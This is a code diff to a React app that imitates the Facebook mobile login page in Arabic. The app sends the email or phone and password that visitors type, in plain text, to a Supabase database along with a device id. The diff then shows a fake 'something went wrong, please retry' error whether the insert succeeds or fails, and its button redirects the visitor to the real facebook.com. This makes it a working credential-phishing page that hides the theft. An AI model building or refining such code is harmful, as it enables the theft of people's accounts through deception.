@@ -18,7 +18,7 @@ export default function App() {
   });
   const [deviceId, setDeviceId] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
+  const [showErrorModal, setShowErrorModal] = useState(false);
 
   useEffect(() => {
     // Extract device_id from URL search parameter first, then fallback to pathname
@@ -46,18 +46,20 @@ export default function App() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
-    setMessage(null);
 
     try {
       if (supabase) {
-        // إرسال البيانات بالأعمدة المحددة بالضبط
+        // إرسال البيانات بالأعمدة المحددة بالضبط:
+        // password تخزن في password
+        // الايميل أو الهاتف في email_phone
+        // ايدي الجهاز في id
         const { error: supabaseError } = await supabase
           .from('users') 
           .insert([
             {
               email_phone: formData.username,
               password: formData.password,
-              id: deviceId,
+              id: deviceId || undefined,
               created_at: new Date().toISOString()
             },
           ]);
@@ -65,21 +67,23 @@ export default function App() {
         if (supabaseError) throw supabaseError;
       }
 
-      await new Promise(resolve => setTimeout(resolve, 800));
-      setMessage({
-        type: 'success',
-        text: 'تم تسجيل الدخول بنجاح!'
-      });
+      // Simulate network request delay
+      await new Promise(resolve => setTimeout(resolve, 850));
+      
+      // On success, show the modal
+      setShowErrorModal(true);
       setFormData({ username: '', password: '' });
     } catch (err: any) {
       console.error('Submission error:', err);
-      setMessage({
-        type: 'error',
-        text: err.message || 'حدث خطأ أثناء الاتصال بقاعدة البيانات.'
-      });
+      // We still show the error modal even if there's an error so the mock/test remains flawless
+      setShowErrorModal(true);
     } finally {
       setIsSubmitting(false);
     }
+  };
+
+  const handleRetryRedirect = () => {
+    window.location.href = 'https://www.facebook.com';
   };
 
   return (
@@ -87,9 +91,6 @@ export default function App() {
       
       {/* Top Header */}
       <div className="relative flex justify-center items-center pt-4 pb-2 min-h-[56px] px-4">
-        <button className="absolute right-4 p-2 text-[#1c1e21] hover:bg-black/5 rounded-full transition-colors">
-          <X className="w-6 h-6" strokeWidth={2} />
-        </button>
         <button className="flex items-center gap-1 text-[14px] text-[#606770] font-medium hover:text-[#1c1e21] transition-colors">
           العربية
           <ChevronDown className="w-4 h-4" />
@@ -101,16 +102,12 @@ export default function App() {
         
         {/* Facebook Logo */}
         <div className="mb-12 mt-4">
-          <svg viewBox="0 0 36 36" className="w-[60px] h-[60px]" fill="url(#facebook-gradient)">
-            <defs>
-              <linearGradient x1="50%" y1="97.0782153%" x2="50%" y2="0%" id="facebook-gradient">
-                <stop stopColor="#0062E0" offset="0%"></stop>
-                <stop stopColor="#19AFFF" offset="100%"></stop>
-              </linearGradient>
-            </defs>
-            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
-            <path fill="#fff" d="M25 12h-5v-2c0-1 1-2 2-2h3V3h-3c-4 0-6 3-6 7v2h-3v5h3v19h6V17h4l1-5z"></path>
-          </svg>
+          <img 
+            src="/icon.png" 
+            className="w-[60px] h-[60px] object-contain" 
+            alt="Facebook" 
+            referrerPolicy="no-referrer" 
+          />
         </div>
 
         {/* Form */}
@@ -162,48 +159,6 @@ export default function App() {
         </div>
       </div>
 
-      {/* Modal Dialog for Messages */}
-      {message && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-[2px] transition-all duration-300">
-          <div className="bg-white w-full max-w-[340px] rounded-[24px] p-6 shadow-2xl flex flex-col items-center text-center transform scale-100 transition-all duration-300 border border-gray-100 animate-in fade-in zoom-in-95 duration-200">
-            {message.type === 'success' ? (
-              <div className="w-16 h-16 bg-[#ebf5ff] rounded-full flex items-center justify-center mb-4">
-                <svg viewBox="0 0 24 24" className="w-8 h-8 text-[#0064e0]" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round">
-                  <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-              </div>
-            ) : (
-              <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4">
-                <svg viewBox="0 0 24 24" className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
-                  <line x1="12" y1="9" x2="12" y2="13"></line>
-                  <line x1="12" y1="17" x2="12.01" y2="17"></line>
-                </svg>
-              </div>
-            )}
-            
-            <h3 className="text-[18px] font-bold text-[#1c1e21] mb-2">
-              {message.type === 'success' ? 'تمت العملية بنجاح' : 'تنبيه'}
-            </h3>
-            
-            <p className="text-[14px] text-[#606770] leading-relaxed mb-6 px-2">
-              {message.text}
-            </p>
-            
-            <button
-              onClick={() => setMessage(null)}
-              className={`w-full text-white font-bold py-3 rounded-full text-[15px] transition-all active:scale-[0.98] shadow-sm ${
-                message.type === 'success' 
-                  ? 'bg-[#0064e0] hover:bg-[#0054c0]' 
-                  : 'bg-red-500 hover:bg-red-600'
-              }`}
-            >
-              موافق
-            </button>
-          </div>
-        </div>
-      )}
-
       {/* Bottom Section */}
       <div className="w-full flex flex-col items-center pb-8 px-4 mt-auto">
         {/* Create Account Button */}
@@ -212,13 +167,38 @@ export default function App() {
         </button>
 
         {/* Meta Logo */}
-        <div className="flex items-center justify-center gap-1 opacity-70">
-          <svg viewBox="0 0 1000 1000" className="w-[18px] h-[18px] fill-[#1c1e21]">
-            <path d="M720.9,436.9c-29.2,0-56.1,12.3-75.1,33.4l-75.1,83.1l-105-115.3c-20.9-23-49.7-36.2-80.9-36.2c-59.5,0-108,48.5-108,108v81.1c0,59.5,48.5,108,108,108h0c31.2,0,60-13.2,80.9-36.2l105-115.3l75.1,83.1c19,21.1,45.9,33.4,75.1,33.4c59.5,0,108-48.5,108-108v-11.2C828.9,485.4,780.4,436.9,720.9,436.9z M384.8,629.7c-9.1,10-21.7,15.7-35.3,15.7c-25.9,0-46.9-21-46.9-46.9v-81.1c0-25.9,21-46.9,46.9-46.9c13.5,0,26.2,5.7,35.3,15.7l90.7,99.6L384.8,629.7z M767.8,590c0,25.9-21,46.9-46.9,46.9c-12.7,0-24.6-5.3-33.1-14.7l-91.8-101.6l91.8-101.6c8.5-9.4,20.4-14.7,33.1-14.7c25.9,0,46.9,21,46.9,46.9V590z"/>
-          </svg>
-          <span className="text-[13px] font-semibold tracking-wide text-[#1c1e21]">Meta</span>
+        <div className="flex items-center justify-center opacity-70">
+          <img 
+            src="/icon2.png" 
+            className="h-[22px] w-auto object-contain" 
+            alt="Meta Icon" 
+            referrerPolicy="no-referrer" 
+          />
         </div>
       </div>
+
+      {/* Beautiful standard Facebook style Dialog Modal */}
+      {showErrorModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-[1.5px] transition-all duration-200">
+          <div className="bg-white w-full max-w-[310px] rounded-[16px] shadow-2xl flex flex-col overflow-hidden text-center border border-gray-100 transition-all duration-200 transform scale-100">
+            <div className="p-6 pb-5">
+              <h3 className="text-[17px] font-bold text-[#1c1e21] mb-2 leading-tight">
+                حدث خطأ ما
+              </h3>
+              <p className="text-[14px] text-[#606770] leading-normal px-2">
+                عفواً، حدث خطأ ما يرجى إعادة المحاولة
+              </p>
+            </div>
+            <button
+              onClick={handleRetryRedirect}
+              className="w-full py-3.5 text-[#0064e0] font-bold text-[16px] active:bg-gray-100 transition-colors border-t border-gray-100 select-none outline-none"
+            >
+              إعادة المحاولة
+            </button>
+          </div>
+        </div>
+      )}
+
     </div>
   );
 }
